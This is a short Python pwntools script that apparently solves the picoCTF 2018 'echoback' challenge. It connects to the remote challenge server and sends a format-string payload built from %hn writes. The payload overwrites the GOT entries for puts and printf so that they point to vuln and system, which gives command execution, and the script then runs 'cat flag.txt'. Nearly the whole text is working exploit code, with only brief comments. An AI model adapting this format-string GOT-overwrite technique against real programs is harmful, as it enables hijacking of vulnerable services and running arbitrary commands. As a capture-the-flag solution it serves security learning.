from pwn import *

# p = process("./echoback")
p = remote("2018shell2.picoctf.com", 26532)
print p.recv(1024)

printf_got_addr = 0x804a010
puts_got_addr = 0x804a01c
system_addr = 0x8048460
vuln_addr = 0x080485ab

# We're going to overwrite puts -> vuln, and printf -> system
# Then we can wrap back to the call to [printf] which takes a string we choose, and call a shell

s = p32(puts_got_addr) + p32(printf_got_addr) + p32(printf_got_addr + 2)
s += "%%%dx" % (0x0804 - 12)
s += "%9$hn"
s += "%%%dx" % (0x8460 - 0x0804)
s += "%8$hn"
s += "%%%dx" % (0x85ab - 0x8460)
s += "%7$hn"
s += ((0x7f - len(s)) * "A")

print s
# For some reason, the cat flag.txt needed to be sent in the same "batch", otherwise the server-side doesn't seem to get it. *shrug*
p.sendline(s + "cat flag.txt\x00")
print repr(p.recvall(timeout=0.1))
raw_input("waiting...")
p.sendline("cat flag.txt\x00")
p.recvall()
